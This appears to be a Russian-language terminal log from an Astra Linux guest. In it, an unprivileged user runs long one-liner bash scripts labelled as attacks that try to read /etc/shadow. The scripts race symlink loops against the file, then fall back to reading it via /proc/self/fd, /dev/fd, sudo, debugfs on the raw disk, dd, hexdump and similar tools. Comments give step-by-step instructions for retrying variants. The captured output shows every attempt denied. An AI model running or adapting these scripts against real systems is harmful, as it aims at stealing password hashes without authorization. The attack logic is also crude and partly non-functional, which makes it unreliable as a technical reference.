–Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ AppArmor: $(aa-status 2>/dev/null | head -1 || echo 'AppArmor –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ kernel modules: $(lsmod | grep -E '(security|capability)' | head -2 || echo '–ú–æ–¥—É–ª–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã')" && echo "–ü—Ä–æ–≤–µ—Ä–∫–∞ mount points: $(mount | grep -E '(security|selinux|apparmor)' | head -2 || echo '–°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Ç–æ—á–∫–∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω—ã')" && echo "=== –ó–ê–ü–£–°–ö –£–õ–¨–¢–†–ê –ú–ï–ì–ê –°–£–ü–ï–† –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..100000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink2; ln -sf /etc/shadow /tmp/race_symlink2 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink2 ] && [ ! -L /tmp/race_symlink2 ]; then if head -1 /tmp/race_symlink2 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 2 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink2 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink3; ln -sf /etc/shadow /tmp/race_symlink3 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink3 ] && [ ! -L /tmp/race_symlink3 ]; then if head -1 /tmp/race_symlink3 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 3 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink3 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink4; ln -sf /etc/shadow /tmp/race_symlink4 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink4 ] && [ ! -L /tmp/race_symlink4 ]; then if head -1 /tmp/race_symlink4 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 4 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink4 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink5; ln -sf /etc/shadow /tmp/race_symlink5 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink5 ] && [ ! -L /tmp/race_symlink5 ]; then if head -1 /tmp/race_symlink5 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 5 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink5 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink6; ln -sf /etc/shadow /tmp/race_symlink6 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink6 ] && [ ! -L /tmp/race_symlink6 ]; then if head -1 /tmp/race_symlink6 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 6 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink6 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink7; ln -sf /etc/shadow /tmp/race_symlink7 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink7 ] && [ ! -L /tmp/race_symlink7 ]; then if head -1 /tmp/race_symlink7 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 7 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink7 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) & (for i in {1..100000}; do rm -f /tmp/race_symlink8; ln -sf /etc/shadow /tmp/race_symlink8 2>/dev/null; done) & (for i in {1..100000}; do if [ -f /tmp/race_symlink8 ] && [ ! -L /tmp/race_symlink8 ]; then if head -1 /tmp/race_symlink8 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION 8 –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink8 > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –£–õ–¨–¢–†–ê –ú–ï–ì–ê –°–£–ü–ï–† –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strings: $(strings /etc/shadow 2>/dev/null | head -3 || echo 'Strings –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ xxd: $(xxd /etc/shadow 2>/dev/null | head -3 || echo 'Xxd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/fs: $(cat /proc/fs/ext4/sda1/options 2>/dev/null | head -1 || echo 'Proc/fs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/meminfo: $(cat /proc/meminfo 2>/dev/null | head -1 || echo 'Proc/meminfo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/version: $(cat /proc/version 2>/dev/null | head -1 || echo 'Proc/version –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/cmdline: $(cat /proc/cmdline 2>/dev/null | head -1 || echo 'Proc/cmdline –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/stat: $(cat /proc/stat 2>/dev/null | head -1 || echo 'Proc/stat –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/uptime: $(cat /proc/uptime 2>/dev/null | head -1 || echo 'Proc/uptime –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/loadavg: $(cat /proc/loadavg 2>/dev/null | head -1 || echo 'Proc/loadavg –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/cpuinfo: $(cat /proc/cpuinfo 2>/dev/null | head -1 || echo 'Proc/cpuinfo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/diskstats: $(cat /proc/diskstats 2>/dev/null | head -1 || echo 'Proc/diskstats –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/net/dev: $(cat /proc/net/dev 2>/dev/null | head -1 || echo 'Proc/net/dev –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/uuid: $(cat /proc/sys/kernel/random/uuid 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/uuid –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/hostname: $(cat /proc/sys/kernel/hostname 2>/dev/null | head -1 || echo 'Proc/sys/kernel/hostname –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/osrelease: $(cat /proc/sys/kernel/osrelease 2>/dev/null | head -1 || echo 'Proc/sys/kernel/osrelease –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/domainname: $(cat /proc/sys/kernel/domainname 2>/dev/null | head -1 || echo 'Proc/sys/kernel/domainname –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/pid_max: $(cat /proc/sys/kernel/pid_max 2>/dev/null | head -1 || echo 'Proc/sys/kernel/pid_max –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/threads-max: $(cat /proc/sys/kernel/threads-max 2>/dev/null | head -1 || echo 'Proc/sys/kernel/threads-max –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/entropy_avail: $(cat /proc/sys/kernel/random/entropy_avail 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/entropy_avail –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/poolsize: $(cat /proc/sys/kernel/random/poolsize 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/poolsize –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/read_wakeup_threshold: $(cat /proc/sys/kernel/random/read_wakeup_threshold 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/read_wakeup_threshold –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/write_wakeup_threshold: $(cat /proc/sys/kernel/random/write_wakeup_threshold 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/write_wakeup_threshold –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/boot_id: $(cat /proc/sys/kernel/random/boot_id 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/boot_id –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/uuid: $(cat /proc/sys/kernel/random/uuid 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/uuid –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/entropy_avail: $(cat /proc/sys/kernel/random/entropy_avail 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/entropy_avail –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/poolsize: $(cat /proc/sys/kernel/random/poolsize 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/poolsize –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/read_wakeup_threshold: $(cat /proc/sys/kernel/random/read_wakeup_threshold 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/read_wakeup_threshold –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/write_wakeup_threshold: $(cat /proc/sys/kernel/random/write_wakeup_threshold 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/write_wakeup_threshold –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/sys/kernel/random/boot_id: $(cat /proc/sys/kernel/random/boot_id 2>/dev/null | head -1 || echo 'Proc/sys/kernel/random/boot_id –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink* 
# =============================================================================
# 1. –û—Ç–∫—Ä–æ–π—Ç–µ —Ç–µ—Ä–º–∏–Ω–∞–ª –≤ –≥–æ—Å—Ç–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ
# 2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞ –≤–µ—Ä—Å–∏—é —Å –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–æ–π
# 3. –ï—Å–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–µ—Ä—Å–∏—é —Å sudo
# 4. –ï—Å–ª–∏ sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø—Ä–æ—Å—Ç—É—é –≤–µ—Ä—Å–∏—é
# 5. –ï—Å–ª–∏ –≤—Å–µ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –≤–æ–∑–º–æ–∂–Ω–æ /etc/shadow –∑–∞—â–∏—â–µ–Ω –æ—Ç race condition
# ============================================================================= 
user@astra:~$ echo "üöÄ RACE CONDITION –° –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò –° –û–ë–•–û–î–û–ú ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && (for i in {1..40000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2>/dev/null; done) & (for i in {1..40000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê:"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: $(cat /proc/self/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /proc/self/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: $(cat /dev/fd/0 < /etc/shadow 2>/dev/null | head -1 || echo '–ß–µ—Ä–µ–∑ /dev/fd –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: $(strace -e trace=open -o /dev/null cat /etc/shadow 2>&1 | head -3 || echo 'Strace –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: $(lsof /etc/shadow 2>/dev/null | head -3 || echo 'Lsof –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: $(debugfs -R 'cat /etc/shadow' /dev/sda1 2>/dev/null | head -3 || echo 'Debugfs –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: $(dd if=/etc/shadow bs=1 count=50 2>/dev/null | head -1 || echo 'Dd –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: $(hexdump -C /etc/shadow 2>/dev/null | head -3 || echo 'Hexdump –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: $(od -c /etc/shadow 2>/dev/null | head -3 || echo 'Od –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target* /tmp/race_symlink* # =============================================================================
[1] 305016
üöÄ RACE CONDITION –° –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê
=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: user
UID: 1001
–ì—Ä—É–ø–ø—ã: user
–ü—Ä–∞–≤–∞ /etc/shadow: -rw-r----- 1 root shadow 1168 –∞–ø—Ä 28 12:24 /etc/shadow
=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò –° –û–ë–•–û–î–û–ú ===
[1]+  –ó–∞–≤–µ—Ä—à—ë–Ω        echo "üöÄ RACE CONDITION –° –¢–ï–•–ù–ò–ö–ê–ú–ò –û–ë–•–û–î–ê" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ì—Ä—É–ø–ø—ã: $(groups)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2> /dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò –° –û–ë–•–û–î–û–ú ===" && rm -f /tmp/race_symlink* /tmp/race_success.txt /tmp/race_target* && echo "test" > /tmp/race_target && ( for i in {1..40000};
do
    rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink 2> /dev/null;
done )
‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!
‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å

üîç –¢–ï–•–ù–ò–ö–ò –û–ë–•–û–î–ê:
bash: /etc/shadow: –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /proc/self/fd: 
bash: /etc/shadow: –û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ /dev/fd: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ strace: bash: strace: –∫–æ–º–∞–Ω–¥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ lsof: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ debugfs: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ dd: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ hexdump: 
–ü–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ od: 


